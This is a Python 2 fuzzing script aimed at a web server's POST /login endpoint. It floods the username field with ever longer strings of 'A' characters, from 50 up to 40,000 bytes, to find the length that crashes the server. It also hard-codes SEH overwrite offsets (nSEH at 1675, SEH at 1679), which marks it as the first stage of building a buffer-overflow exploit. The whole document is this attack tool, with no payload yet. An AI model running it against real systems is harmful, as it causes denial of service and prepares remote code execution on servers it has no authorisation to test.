#!/usr/bin/env python
import sys, socket, struct, time
 
if len(sys.argv) <= 2:
    print "Usage: python " + sys.argv[0] + " [host] [port]"
    exit()
 
host = sys.argv[1]    
port = int(sys.argv[2])

maxlength = 40000
mess_size = 50
increment = 100

crash_nseh = 1675
crash_seh = crash_nseh + 4

print "[+] Connecting to " + host + "\n"

while mess_size < maxlength:
    try:
        print "[+] Fuzzing with " + str(mess_size) + " length message..."
    
        craftedreq = "A" * mess_size

        req = (
                "POST /login HTTP/1.1\r\n"
                "Host: " + host + ":" + str(port) + "\r\n"
                "User-Agent: hodorweb\r\n"
                "Connection: close\r\n"
                "Content-Length: 10000\r\n\r\n"
                "username=" + craftedreq + "&password=1234\r\n\r\n"
        )
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #s.settimeout(2)
        s.connect((host, port))
        #s.recv(1024)
        s.send(req)
        #s.recv(1024)
        s.close()

        time.sleep(0.5)
    
        mess_size += increment
    except Exception,e:
        print "[!] Error occured: " + str(e)
        print "[*] Crashed occured at buffer length: " + str(len(craftedreq))
        sys.exit()

